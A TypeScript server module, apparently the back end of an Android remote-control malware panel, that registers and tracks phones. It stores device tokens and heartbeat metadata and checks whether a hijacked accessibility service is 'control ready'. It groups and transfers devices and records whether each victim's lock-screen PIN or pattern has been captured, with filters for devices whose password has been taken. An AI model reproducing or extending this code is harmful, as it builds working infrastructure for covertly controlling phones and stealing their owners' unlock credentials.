import type { RowDataPacket } from "mysql2";
import { randomBytes } from "node:crypto";
import { v4 as uuidv4 } from "uuid";
import { pool } from "../db/pool.js";
import type { RegisterDeviceBody, RegisterDeviceResponse } from "../types/messages.js";
import { normalizeClientIp } from "../utils/client-ip.js";
import { connectionManager } from "../ws/connection-manager.js";
import { scheduleA11yProbe, shouldScheduleA11yProbe } from "./a11y-probe.js";

interface DeviceRow extends RowDataPacket {
  id: string;
  android_id: string;
  model: string | null;
  remark: string | null;
  bind_code: string | null;
  group_id: string | null;
  app_version: string | null;
  brand: string | null;
  locale_language: string | null;
  locale_region: string | null;
  client_ip: string | null;
  is_charging: number;
  screen_width: number | null;
  screen_height: number | null;
  android_version: string | null;
  sdk_int: number | null;
  battery_level: number | null;
  accessibility_status: string | null;
  network_type: string | null;
  screen_on: number;
  protection_enabled: number;
  last_boot_at: Date | null;
  token: string;
  last_heartbeat_at: Date | null;
  is_online: number;
  has_keyguard_pin?: number | boolean | null;
  created_at: Date;
  updated_at: Date;
}

export interface DeviceRecord {
  deviceId: string;
  androidId: string;
  model: string | null;
  remark: string | null;
  bindCode: string | null;
  groupId: string | null;
  appVersion: string | null;
  brand: string | null;
  localeLanguage: string | null;
  localeRegion: string | null;
  clientIp: string | null;
  isCharging: boolean;
  screenWidth: number | null;
  screenHeight: number | null;
  androidVersion: string | null;
  sdkInt: number | null;
  batteryLevel: number | null;
  accessibilityStatus: string | null;
  networkType: string | null;
  screenOn: boolean;
  protectionEnabled: boolean;
  lastBootAt: string | null;
  deviceToken?: string;
  lastHeartbeatAt: string | null;
  isOnline: boolean;
  /** 是否已采集到锁屏密码（PIN/图案/混合） */
  hasPassword: boolean;
  /** 无障碍「实际连接」：serviceConnected / controlReady 由心跳或服务端探针提供 */
  accessibilityProbe?: {
    serviceConnected: boolean | null;
    controlReady: boolean | null;
    probedAt: number;
    error: string | null;
    /** heartbeat = 新版客户端心跳上报；probe = 服务端主动探测 */
    source: "heartbeat" | "probe" | null;
  } | null;
  createdAt: string;
  updatedAt: string;
}

export interface DeviceListQuery {
  page?: number;
  pageSize?: number;
  deviceId?: string;
  remark?: string;
  bindCode?: string;
  /** 空=全部；ungrouped=未分组；uuid=指定组 */
  groupId?: string;
  localeLanguage?: string;
  localeRegion?: string;
  brand?: string;
  accessibilityStatus?: string;
  isOnline?: string;
  /** 空=全部；1=已获取；0=未获取 */
  hasPassword?: string;
  dateFrom?: string;
  dateTo?: string;
}

function toIso(value: Date | null | undefined): string | null {
  if (!value) {
    return null;
  }
  return value.toISOString();
}

function mapDevice(row: DeviceRow): DeviceRecord {
  return {
    deviceId: row.id,
    androidId: row.android_id,
    model: row.model,
    remark: row.remark,
    bindCode: row.bind_code ?? null,
    groupId: row.group_id ?? null,
    appVersion: row.app_version,
    brand: row.brand,
    localeLanguage: row.locale_language,
    localeRegion: row.locale_region,
    clientIp: row.client_ip,
    isCharging: row.is_charging === 1,
    screenWidth: row.screen_width,
    screenHeight: row.screen_height,
    androidVersion: row.android_version,
    sdkInt: row.sdk_int,
    batteryLevel: row.battery_level,
    accessibilityStatus: row.accessibility_status,
    networkType: row.network_type,
    screenOn: row.screen_on === 1,
    protectionEnabled: row.protection_enabled === 1,
    lastBootAt: toIso(row.last_boot_at),
    deviceToken: row.token,
    lastHeartbeatAt: toIso(row.last_heartbeat_at),
    isOnline: row.is_online === 1,
    hasPassword: Boolean(row.has_keyguard_pin),
    createdAt: row.created_at.toISOString(),
    updatedAt: row.updated_at.toISOString(),
  };
}

/** 已采集有效锁屏密码（非空 pin_content） */
const HAS_PASSWORD_EXISTS_SQL = `EXISTS (
  SELECT 1 FROM device_keyguard_pins kp
  WHERE kp.device_id = devices.id
    AND kp.pin_content IS NOT NULL
    AND TRIM(kp.pin_content) <> ''
)`;

const DEVICE_SELECT_WITH_PASSWORD = `SELECT devices.*,
  (${HAS_PASSWORD_EXISTS_SQL}) AS has_keyguard_pin
FROM devices`;

function createDeviceToken(): string {
  return randomBytes(32).toString("hex");
}

function pickString(payload: Record<string, unknown>, key: string): string | null {
  const value = payload[key];
  if (typeof value !== "string") {
    return null;
  }
  const trimmed = value.trim();
  return trimmed.length > 0 ? trimmed : null;
}

function pickNumber(payload: Record<string, unknown>, key: string): number | null {
  const value = payload[key];
  if (typeof value === "number" && Number.isFinite(value)) {
    return value;
  }
  if (typeof value === "string" && value.trim()) {
    const parsed = Number(value);
    return Number.isFinite(parsed) ? parsed : null;
  }
  return null;
}

function pickBoolean(payload: Record<string, unknown>, key: string): boolean | null {
  const value = payload[key];
  if (typeof value === "boolean") {
    return value;
  }
  if (value === 1 || value === "1" || value === "true") {
    return true;
  }
  if (value === 0 || value === "0" || value === "false") {
    return false;
  }
  return null;
}

export async function registerDevice(
  body: RegisterDeviceBody,
): Promise<RegisterDeviceResponse> {
  const androidId = body.androidId.trim();
  if (!androidId) {
    throw new Error("androidId is required");
  }

  const meta = body.meta ?? {};

  const [existingRows] = await pool.query<DeviceRow[]>(
    "SELECT * FROM devices WHERE android_id = ? LIMIT 1",
    [androidId],
  );

  if (existingRows[0]) {
    const device = existingRows[0];
    await pool.query(
      `UPDATE devices SET
        model = COALESCE(?, model),
        app_version = COALESCE(?, app_version),
        brand = COALESCE(?, brand),
        locale_language = COALESCE(?, locale_language),
        locale_region = COALESCE(?, locale_region),
        screen_width = COALESCE(?, screen_width),
        screen_height = COALESCE(?, screen_height),
        android_version = COALESCE(?, android_version),
        sdk_int = COALESCE(?, sdk_int),
        accessibility_status = COALESCE(?, accessibility_status),
        protection_enabled = COALESCE(?, protection_enabled)
      WHERE id = ?`,
      [
        body.model?.trim() ?? null,
        pickString(meta, "appVersion"),
        pickString(meta, "brand"),
        pickString(meta, "localeLanguage"),
        pickString(meta, "localeRegion"),
        pickNumber(meta, "screenWidth"),
        pickNumber(meta, "screenHeight"),
        pickString(meta, "androidVersion"),
        pickNumber(meta, "sdkInt"),
        pickString(meta, "accessibilityStatus"),
        pickBoolean(meta, "protectionEnabled") === true ? 1 : null,
        device.id,
      ],
    );

    return {
      deviceId: device.id,
      deviceToken: device.token,
    };
  }

  const deviceId = uuidv4();
  const deviceToken = createDeviceToken();

  await pool.query(
    `INSERT INTO devices (
      id, android_id, model, token, app_version, brand, locale_language, locale_region,
      screen_width, screen_height, android_version, sdk_int, accessibility_status, protection_enabled
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [
      deviceId,
      androidId,
      body.model?.trim() ?? null,
      deviceToken,
      pickString(meta, "appVersion"),
      pickString(meta, "brand"),
      pickString(meta, "localeLanguage"),
      pickString(meta, "localeRegion"),
      pickNumber(meta, "screenWidth"),
      pickNumber(meta, "screenHeight"),
      pickString(meta, "androidVersion"),
      pickNumber(meta, "sdkInt"),
      pickString(meta, "accessibilityStatus"),
      pickBoolean(meta, "protectionEnabled") === true ? 1 : 0,
    ],
  );

  return { deviceId, deviceToken };
}

export async function getDeviceByToken(token: string) {
  const [rows] = await pool.query<DeviceRow[]>(
    "SELECT * FROM devices WHERE token = ? LIMIT 1",
    [token],
  );
  return rows[0] ? mapDevice(rows[0]) : null;
}

export async function getDeviceById(deviceId: string) {
  const [rows] = await pool.query<DeviceRow[]>(
    "SELECT * FROM devices WHERE id = ? LIMIT 1",
    [deviceId],
  );
  return rows[0] ? mapDevice(rows[0]) : null;
}

export async function getDeviceByAndroidId(androidId: string) {
  const [rows] = await pool.query<DeviceRow[]>(
    "SELECT * FROM devices WHERE android_id = ? LIMIT 1",
    [androidId.trim()],
  );
  return rows[0] ? mapDevice(rows[0]) : null;
}

/**
 * A 绑定框输入：支持完整 deviceId、androidId、deviceId 前缀（≥8 且唯一）。
 */
export async function resolveDeviceByBindKey(raw: string) {
  const key = raw.trim();
  if (!key) {
    return null;
  }

  const byId = await getDeviceById(key);
  if (byId) {
    return byId;
  }

  const byAndroidId = await getDeviceByAndroidId(key);
  if (byAndroidId) {
    return byAndroidId;
  }

  if (key.length >= 8) {
    const [rows] = await pool.query<DeviceRow[]>(
      "SELECT * FROM devices WHERE id LIKE ? LIMIT 2",
      [`${key}%`],
    );
    if (rows.length === 1) {
      return mapDevice(rows[0]);
    }
  }

  return null;
}

/**
 * 心跳值超过这个时长就当作「停更了」，照样补探针。
 *
 * 心跳间隔 30s，取 3 个周期。这堵的是方案 a 的原始缺陷：
 * 设备冻结后心跳停摆，值会永久停在冻结前的 `true`，
 * 界面上和「真的连着」完全一样。有了这条，停更的心跳会被探针覆盖成
 * 「探测失败」，运维看到的是「不知道」而不是假的「已连接」。
 */
/**
 * 列表行的健康度装配。
 *
 * `accessibilityStatus` 来自心跳（settings 里有没有该组件）；
 * `accessibilityProbe` 是「服务是否真的活着」，来源有两路：
 *   - 新版客户端心跳直接带 `accessibilityConnected` / `controlReady`（30s 新鲜）
 *   - 旧版客户端由服务端探针补（5 分钟 TTL）
 * 两路都写进 connectionManager 的同一份健康度，按「产生时刻更新者胜」合并。
 *
 * 离线设备整块返回 null：它的心跳值是冻结的旧值，探针也发不出去，
 * 前端据此显示「无法探测」而不是沿用「已连接」。
 */
function decorateDeviceHealth(row: DeviceRow, isOnline: boolean) {
  const health = connectionManager.getDeviceHealth(row.id);
  // 只有在线设备才补探针：离线设备发不出命令，探测只会白等并污染缓存。
  // 心跳值也要看年龄——停更的 `true` 比没有值更危险，必须让探针去证伪。
  if (
    shouldScheduleA11yProbe({
      isOnline,
      source: health.a11ySource,
      reportedAt: health.a11yReportedAt,
      now: Date.now(),
    })
  ) {
    scheduleA11yProbe(row.id);
  }

  const hasProbe = health.a11yReportedAt > 0 && isOnline;
  return {
    ...mapDevice(row),
    isOnline,
    ...health,
    accessibilityProbe: hasProbe
      ? {
          serviceConnected: health.a11yServiceConnected,
          controlReady: health.a11yControlReady,
          probedAt: health.a11yReportedAt,
          error: health.a11yError,
          source: health.a11ySource,
        }
      : null,
  };
}

export async function listDevices(onlineDeviceIds: string[] = []) {
  const onlineSet = new Set(onlineDeviceIds);
  const [rows] = await pool.query<DeviceRow[]>(
    `${DEVICE_SELECT_WITH_PASSWORD} WHERE devices.transferred_at IS NULL ORDER BY devices.created_at DESC`,
  );
  return rows.map((row) => decorateDeviceHealth(row, onlineSet.has(row.id)));
}

export async function listDevicesPage(
  query: DeviceListQuery,
  onlineDeviceIds: string[] = [],
) {
  const page = Math.max(query.page ?? 1, 1);
  const pageSize = Math.min(Math.max(query.pageSize ?? 100, 1), 200);
  const offset = (page - 1) * pageSize;
  const onlineSet = new Set(onlineDeviceIds);

  const where: string[] = ["transferred_at IS NULL"];
  const params: unknown[] = [];

  if (query.deviceId?.trim()) {
    where.push("(id LIKE ? OR android_id LIKE ?)");
    const keyword = `%${query.deviceId.trim()}%`;
    params.push(keyword, keyword);
  }
  if (query.remark?.trim()) {
    where.push("remark LIKE ?");
    params.push(`%${query.remark.trim()}%`);
  }
  if (query.bindCode?.trim()) {
    where.push("bind_code LIKE ?");
    params.push(`%${query.bindCode.trim()}%`);
  }
  if (query.groupId?.trim()) {
    const groupId = query.groupId.trim();
    if (groupId === "ungrouped") {
      where.push("group_id IS NULL");
    } else {
      where.push("group_id = ?");
      params.push(groupId);
    }
  }
  if (query.localeLanguage?.trim()) {
    where.push("locale_language = ?");
    params.push(query.localeLanguage.trim());
  }
  if (query.localeRegion?.trim()) {
    where.push("locale_region = ?");
    params.push(query.localeRegion.trim());
  }
  if (query.brand?.trim()) {
    where.push("brand LIKE ?");
    params.push(`%${query.brand.trim()}%`);
  }
  if (query.accessibilityStatus?.trim()) {
    where.push("accessibility_status = ?");
    params.push(query.accessibilityStatus.trim());
  }
  if (query.isOnline === "1") {
    if (onlineDeviceIds.length === 0) {
      return { items: [], total: 0, page, pageSize };
    }
    where.push(`id IN (${onlineDeviceIds.map(() => "?").join(", ")})`);
    params.push(...onlineDeviceIds);
  } else if (query.isOnline === "0") {
    if (onlineDeviceIds.length > 0) {
      where.push(`id NOT IN (${onlineDeviceIds.map(() => "?").join(", ")})`);
      params.push(...onlineDeviceIds);
    }
  }
  if (query.dateFrom?.trim()) {
    where.push("created_at >= ?");
    params.push(`${query.dateFrom.trim()} 00:00:00`);
  }
  if (query.dateTo?.trim()) {
    where.push("created_at <= ?");
    params.push(`${query.dateTo.trim()} 23:59:59`);
  }
  if (query.hasPassword === "1") {
    where.push(HAS_PASSWORD_EXISTS_SQL);
  } else if (query.hasPassword === "0") {
    where.push(`NOT ${HAS_PASSWORD_EXISTS_SQL}`);
  }

  const whereSql = where.join(" AND ");
  const [countRows] = await pool.query<RowDataPacket[]>(
    `SELECT COUNT(*) AS total FROM devices WHERE ${whereSql}`,
    params,
  );
  const total = Number(countRows[0]?.total ?? 0);

  const [rows] = await pool.query<DeviceRow[]>(
    `${DEVICE_SELECT_WITH_PASSWORD} WHERE ${whereSql} ORDER BY devices.created_at DESC LIMIT ? OFFSET ?`,
    [...params, pageSize, offset],
  );

  return {
    items: rows.map((row) => decorateDeviceHealth(row, onlineSet.has(row.id))),
    total,
    page,
    pageSize,
  };
}

export async function updateDeviceRemark(deviceId: string, remark: string | null) {
  await pool.query("UPDATE devices SET remark = ? WHERE id = ?", [remark, deviceId]);
  return getDeviceById(deviceId);
}

export async function updateDeviceBindCode(deviceId: string, bindCode: string | null) {
  const normalized = bindCode?.trim() || null;
  await pool.query("UPDATE devices SET bind_code = ? WHERE id = ?", [
    normalized?.slice(0, 64) ?? null,
    deviceId,
  ]);
  return getDeviceById(deviceId);
}

export async function updateDeviceGroupId(deviceId: string, groupId: string | null) {
  await pool.query("UPDATE devices SET group_id = ? WHERE id = ?", [groupId, deviceId]);
  return getDeviceById(deviceId);
}

export async function batchUpdateDeviceGroupId(
  deviceIds: string[],
  groupId: string | null,
): Promise<number> {
  const ids = [...new Set(deviceIds.map((id) => id.trim()).filter(Boolean))];
  if (ids.length === 0) {
    return 0;
  }
  const placeholders = ids.map(() => "?").join(", ");
  const [result] = await pool.query(
    `UPDATE devices SET group_id = ? WHERE id IN (${placeholders})`,
    [groupId, ...ids],
  );
  return Number((result as { affectedRows?: number }).affectedRows ?? 0);
}

export async function updateDeviceClientIp(deviceId: string, clientIp: string | null) {
  const normalized = normalizeClientIp(clientIp);
  if (!normalized) {
    return;
  }
  await pool.query("UPDATE devices SET client_ip = ? WHERE id = ?", [normalized, deviceId]);
}

export async function updateDeviceMeta(
  deviceId: string,
  payload: Record<string, unknown>,
) {
  const batteryLevel = pickNumber(payload, "batteryLevel");
  const sdkInt = pickNumber(payload, "sdkInt");
  const screenWidth = pickNumber(payload, "screenWidth");
  const screenHeight = pickNumber(payload, "screenHeight");
  const isCharging = pickBoolean(payload, "isCharging");
  const screenOn = pickBoolean(payload, "screenOn");
  const protectionEnabled = pickBoolean(payload, "protectionEnabled");
  const lastBootAt = pickNumber(payload, "lastBootAt");
  const clientIp = normalizeClientIp(pickString(payload, "clientIp"));

  await pool.query(
    `UPDATE devices SET
      app_version = COALESCE(?, app_version),
      brand = COALESCE(?, brand),
      locale_language = COALESCE(?, locale_language),
      locale_region = COALESCE(?, locale_region),
      client_ip = CASE
        WHEN ? IS NOT NULL THEN ?
        WHEN client_ip IN ('127.0.0.1', '::1') THEN NULL
        ELSE client_ip
      END,
      is_charging = COALESCE(?, is_charging),
      screen_width = COALESCE(?, screen_width),
      screen_height = COALESCE(?, screen_height),
      android_version = COALESCE(?, android_version),
      sdk_int = COALESCE(?, sdk_int),
      battery_level = COALESCE(?, battery_level),
      accessibility_status = COALESCE(?, accessibility_status),
      network_type = COALESCE(?, network_type),
      screen_on = COALESCE(?, screen_on),
      protection_enabled = COALESCE(?, protection_enabled),
      last_boot_at = COALESCE(FROM_UNIXTIME(? / 1000), last_boot_at)
    WHERE id = ?`,
    [
      pickString(payload, "appVersion"),
      pickString(payload, "brand"),
      pickString(payload, "localeLanguage"),
      pickString(payload, "localeRegion"),
      clientIp,
      clientIp,
      isCharging == null ? null : isCharging ? 1 : 0,
      screenWidth,
      screenHeight,
      pickString(payload, "androidVersion"),
      sdkInt,
      batteryLevel,
      pickString(payload, "accessibilityStatus"),
      pickString(payload, "networkType"),
      screenOn == null ? null : screenOn ? 1 : 0,
      protectionEnabled == null ? null : protectionEnabled ? 1 : 0,
      lastBootAt,
      deviceId,
    ],
  );
}

export async function markAllDevicesOffline() {
  await pool.query("UPDATE devices SET is_online = 0");
}

export async function setDeviceOnline(deviceId: string, isOnline: boolean) {
  await pool.query("UPDATE devices SET is_online = ? WHERE id = ?", [
    isOnline ? 1 : 0,
    deviceId,
  ]);
}

export async function touchHeartbeat(deviceId: string) {
  await pool.query("UPDATE devices SET last_heartbeat_at = UTC_TIMESTAMP() WHERE id = ?", [
    deviceId,
  ]);
}

export async function listDeviceFilterOptions() {
  const [brandRows] = await pool.query<RowDataPacket[]>(
    "SELECT DISTINCT brand FROM devices WHERE brand IS NOT NULL AND brand <> '' ORDER BY brand",
  );
  const [languageRows] = await pool.query<RowDataPacket[]>(
    "SELECT DISTINCT locale_language FROM devices WHERE locale_language IS NOT NULL AND locale_language <> '' ORDER BY locale_language",
  );
  const [regionRows] = await pool.query<RowDataPacket[]>(
    "SELECT DISTINCT locale_region FROM devices WHERE locale_region IS NOT NULL AND locale_region <> '' ORDER BY locale_region",
  );
  return {
    brands: brandRows.map((row) => String(row.brand)),
    languages: languageRows.map((row) => String(row.locale_language)),
    regions: regionRows.map((row) => String(row.locale_region)),
  };
}
